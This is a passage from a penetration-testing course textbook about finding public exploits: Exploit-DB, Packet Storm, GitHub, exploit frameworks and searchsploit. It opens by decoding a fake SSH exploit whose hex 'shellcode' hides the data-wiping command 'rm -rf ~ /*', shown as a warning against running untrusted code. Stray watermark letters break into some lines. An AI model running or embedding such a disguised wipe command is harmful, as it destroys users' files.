Further examination of the payload revealed an interesting jmpcode array.
[...]
char jmpcode[] =
"\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
"\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26";
[...]
Listing 350 - Malicious SSH exploit hex encoded payload
Although it was masked as shellcode,710 the “jmpcode” character array was actually a hex-
encoded string containing a malicious shell command. y
kali@kali:~$ python3
k
>>> jmpcode = [
... "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
s
... "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26"]
>>> print(jmpcode)
['rm -rf ~ /* 2> /dev/null &'] o
>>>
Listing 351 - Malicious SSH exploit payload that will wipe your attacking machine
n
This single command would effectively wipe out the would-be attacker’s UNIX-based filesystem.
The program would then connect to a public IRC server to announce the user’s actions to the
i
world, making this an extremely dangerous and potentially embarrassing malicious exploit!
z
Given this danger, we will rely on more trustworthy exploit repositories in this Module.
D
The online resources mentioned in this Module analyze the submitted exploit code before hosting
it online; however, it is still important to properly read the code ourselves to get a rough idea of
what it will do upon execution. And if we are not yet proficient in programming, this is a great way
to improve our code-reading skills.
Exploits that are written in a low-level programming language and require compilation are often
hosted in both source code and binary format. While cumbersome to compile, source code is
easier to inspect than binaries (without the assistance of specialized skills and tools).
If code inspection or compilation is too complex, we can set up a virtual machine environment
with clean snapshots as an exploit testing ground, or sandbox. The snapshots on a newly set up
environment allow it to be easily reconstructed if infected by something malicious or if the exploit
causes it to break.
15.2 Online Exploit Resources
This Learning Unit covers the following Learning Objectives:
• Access multiple online exploit resources
710 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Shellcode
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 454
Made in Morocco
Penetration Testing with Kali Linux
• Differentiate between various online exploit resources
• Understand the risks between online exploit resources
• Use Google search operators to discover public exploits
After the information gathering and enumeration stages of a penetration test, we can cross-check
discovered software for known vulnerabilities in an attempt to find published exploits.
Various online resources host exploit code and make it available to the public for free. In this
section, we will cover the most popular online resources. The first two we’ll inspect usually
conduct tests on the submitted exploit code and remove any that are deemed fake or malicious.
15.2.1 The Exploit Database
The Exploit Database711 (commonly known as Exploit-DB or EDB) is a project maintained by
y
OffSec.712 It is a free archive of public exploits that are gathered through submissions, mailing
lists, and public resources.
k
s
o
n
i
z
D
Figure 226: The Exploit Database homepage
Let’s take a moment to analyze the homepage. By default, the list is sorted with the newest
exploit at the top. The fields that will be covered are highlighted in the above image.
The D field is a quick way we can download the exploit file.
The A field lists the vulnerable application files of respective exploits which we can download for
research and testing (if available).
The V field marks whether the exploit has been verified. Exploits with the verified checkmark have
been reviewed, executed, and concluded to be a functioning exploit. These are reviewed by
trusted members and add further assurance that the exploit is safe and functional.
711 (OffSec, 2023), https://www.exploit-db.com
712 (OffSec, 2023), https://www.offsec.com
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 455
Made in Morocco
Penetration Testing with Kali Linux
The Title field will usually give the vulnerable application name along with its respective vulnerable
version and the function of the exploit.
The Type field designates the exploit as one of the following: dos, local, remote, or webapp.
The Platform field designates which kind of system(s) are affected by the exploit. This can be
operating systems, hardware, or even code language services such as PHP.
The last field designates the Author of the exploit.
Let’s browse to an exploit to get more information. In this demonstration, we’ll browse to m1k1o’s
Blog v.10 - Remote Code Execution (RCE) (Authenticated).713
y
k
s
o
n
i
z
Figure 227: mD1k1o’s Blog v.10 - Remote Code Execution (RCE) (Authenticated)
Each exploit has a unique ID (a numeric value), known as the EDB-ID, which is also placed at the
end of the URL of the respective exploit’s page. The associated Common Vulnerabilities and
Exposures (CVE) that the exploit impacts is also listed. Below the information fields, which we
analyzed before, is the text of the exploit code. We can use the Exploit-DB site in this way to do
quick code reviews before downloading the exploit.
Exploit Database updates are announced through Twitter714 and RSS715 feeds.
15.2.2 Packet Storm
Packet Storm716 is an information security website that provides up-to-date information on
security news, exploits, and tools (published tools by security vendors) for educational and testing
purposes.
713 (Exploit DB, 2022), https://www.exploit-db.com/exploits/50943
714 (Twitter, 2022), https://twitter.com/exploitdb
715 (OffSec, 2023), https://www.exploit-db.com/rss.xml
716 (Packet Storm, 2022), https://packetstormsecurity.com
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 456
Made in Morocco
Penetration Testing with Kali Linux
y
k
s
o
n
i
z
Figure 228: Packet Storm homepage
D
Like the previously-mentioned online resources, Packet Storm also posts updates to Twitter717
and hosts an RSS feed.718
15.2.3 GitHub
GitHub719 is an online code hosting platform for version control and collaboration. This allows
anyone to create and share code, including exploits.
717 (Twitter, 2022), https://twitter.com/packet_storm
718 (Packet Storm, 2022), https://packetstormsecurity.com/feeds
719 (GitHub, 2022), https://github.com/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 457
Made in Morocco
Penetration Testing with Kali Linux
y
k
s
o
n
i
z
Figure 229: GitHub homepage
D
Due to its open nature, using exploits from GitHub presents a large security risk and caution is
advised. Unlike the previous two resources covered, GitHub repositories can be created by
anyone and distributed without oversight. For example, a user recently tweeted720 a warning that
anyone executing a specific malicious exploit hosted on GitHub would instead be infected with a
backdoor.
720 (Twitter, 2022), https://twitter.com/haxor31337/status/1527182890869530624
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 458
Made in Morocco
Penetration Testing with Kali Linux
Figure 230: Malicious GitHub Exploit Warning y
This is not to say that all GitHub repositories are malicious, but they all must be treated with
caution. A benefit of using GitHub as an exploit resource is tkhe speed at which exploits can be
made available. Members of the security community can create proof-of-concept code and share
it almost as quickly as new vulnerabilities pop up.
s
OffSec has a GitHub account where we can find different repositories like exploitdb-bin-sploits,
which contains pre-compiled exploits for easy exeocution.
n
i
z
D
Figure 231: OffSec GitHub
15.2.4 Google Search Operators
In addition to the individual websites that we covered above, we can search for additional exploit-
hosting sites using popular search engines.
We can begin searching for exploits using a specific software’s version followed by the “exploit”
keyword and include various search operators (like those used by the Google search engine721) to
721 (Ahrefs Pte, Ltd., 2018), https://ahrefs.com/blog/google-advanced-search-operators/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 459
Made in Morocco
Penetration Testing with Kali Linux
narrow our search. Mastering these advanced operators can help us tailor our results to find
exactly what we are searching for.
As an example, we can use the following search query to locate vulnerabilities affecting the
Microsoft Edge browser and limit the results to only those exploits that are hosted on the Exploit
Database website.
kali@kali:~$ firefox --search "Microsoft Edge site:exploit-db.com"
Listing 352 - Using Google to search for Microsoft Edge exploits on exploit-db.com
Some other search operators that can be used to fine-tune our results include inurl, intext, and
intitle.
Use extreme caution when using exploits from non-curated ryesources!
k
15.3 Offline Exploit Resources
s
This Learning Unit covers the following Learning Objectives:
• Access Multiple Exploit Frameworks o
• Use SearchSploit
n
• Use Nmap NSE Scripts
Internet access is not always guaranteed during a penetration test. Should the assessment take
i
place in an isolated environment, the Kali Linux distribution comes with various tools that provide
z
offline access to exploits.
15.3.1 Exploit FrDameworks
An exploit framework722 is a software package that contains reliable exploits for easy execution
against a target. These frameworks have a standardized format for configuring an exploit and
allow both online and offline access to the exploits. This section will cover some popular exploit
frameworks.
Metasploit723 is an excellent framework built to assist in the development and execution of
exploits. It was created by H D Moore in 2003 and is owned by Rapid7. It allows for easy
execution of pre-loaded exploits with minor configuration settings. This framework has a free
community edition and a paid pro version. We will cover Metasploit in detail in a later Module, but
it is important to be aware of this exploit framework.
Core Impact724 is another exploit framework owned by HelpSystems and there are no free
versions for this framework. This framework can automate testing, link to vulnerability scanners,
complete phishing campaigns, and re-test exploited systems to verify remediation was
completed after a penetration test.
722 (McNab, 2007), https://www.oreilly.com/library/view/network-security-assessment/9780596510305/ch16.html
723 (Rapid7, 2022), https://www.metasploit.com
724 (HelpSystems, 2022), https://www.cobaltstrike.com/core-impact/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 460
Made in Morocco
Penetration Testing with Kali Linux
Canvas,725 made by Immunity, is another exploit framework. Once the product is paid for, exploits
are regularly updated every month.
The Browser Exploitation Framework (BeEF)726 is a penetration testing tool focused on client-side
attacks executed within a web browser.
We covered some popular exploit frameworks for penetration testing. Although we only briefly
detailed each one, it is valuable to know the resources available in exploit frameworks.
15.3.2 SearchSploit
The Exploit Database provides a downloadable archived copy of all the hosted exploit code. This
archive is included by default in Kali in the exploitdb package. We recommended updating the
package before any assessment to ensure the latest exploits are installed. The package can be
updated using the following commands:
y
kali@kali:~$ sudo apt update && sudo apt install exploitdb
[sudo] password for kali: k
...
The following packages will be upgraded:
s
exploitdb
...
Setting up exploitdb (20220526-0kali1) ... o
...
Listing 353 - Updating the exploitdb package from the Kali Linux repositories
n
The above command updates the local copy of the Exploit Database archive under
/usr/share/exploitdb/. This directory is split into two major sections, exploits and shellcodes. The
/usr/share/exploitdb/ directory conitains CSV files for each of the exploits and shellcodes
directories. Each CSV file contzains the file information of all files within their respective
subdirectories. These CSV files contain similar information to the Exploit DB website, such as the
EDB-ID, title, author, platformD, and other information we covered previously.
kali@kali:~$ ls -1 /usr/share/exploitdb/
exploits
files_exploits.csv
files_shellcodes.csv
shellcodes
Listing 354 - Listing the two major sections in the archive main directory with the database reference files
When we redirect to the exploits directory, we’ll find many sub-directories containing all of the
exploits. These sub-directories are separated based on operating system, architecture, scripting
language, etc. For example, the linux subdirectory contains all Linux-related exploits.
kali@kali:~$ ls -1 /usr/share/exploitdb/exploits
aix
alpha
android
arm
ashx
725 (Immunity, 2022), http://immunityinc.com/products/canvas/index.html
726 (BeEF, 2022), http://beefproject.com
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 461
Made in Morocco
Penetration Testing with Kali Linux
asp
aspx
atheos
beos
bsd
bsd_x86
cfm
cgi
freebsd
freebsd_x86
...
Listing 355 - Listing the content of the exploits directory
Manually searching the Exploit Database is by no means ideal, especially given the large quantity
of exploits in the archive. This is where the searchsploit utility comes in handy.
y
We can run searchsploit from the command line without any parameters to display its usage:
kali@kali:~$ searchsploit k
Usage: searchsploit [options] term1 [term2] ... [termN]
...
s
Listing 356 - The searchsploit command syntax
As the built-in examples reveal, searchsploit allowos us to search through the entire archive and
display results based on various search options provided as arguments.
========== n
Examples
==========
searchsploit afd windows locali
searchsploit -t oracle windozws
searchsploit -p 39446
searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"
D
searchsploit -s Apache Struts 2.0.0
searchsploit linux reverse password
searchsploit -j 55555 | json_pp